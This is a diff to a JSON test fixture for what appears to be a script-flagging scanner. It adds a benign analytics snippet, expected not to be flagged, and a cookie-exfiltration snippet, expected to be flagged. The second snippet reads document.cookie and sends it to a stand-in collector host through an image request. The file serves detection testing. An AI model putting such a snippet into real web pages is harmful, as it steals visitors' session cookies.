@@ -345,6 +345,22 @@
       "expect": {
         "maxConflicts": 0
       }
+    },
+    {
+      "id": "script-routine-analytics-snippet-not-harmful",
+      "kind": "script",
+      "script": "<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-XXXXXXX\"></script>\n<script>\n  window.dataLayer = window.dataLayer || [];\n  function gtag(){dataLayer.push(arguments);}\n  gtag('js', new Date());\n  gtag('config', 'G-XXXXXXX');\n</script>",
+      "expect": {
+        "flagged": false
+      }
+    },
+    {
+      "id": "script-cookie-sending-snippet-flagged",
+      "kind": "script",
+      "script": "<script>\n  (function () {\n    var d = document.cookie;\n    new Image().src = \"https://collector.example.invalid/c?d=\" + encodeURIComponent(d);\n  })();\n</script>",
+      "expect": {
+        "flagged": true
+      }
     }
   ]
 }
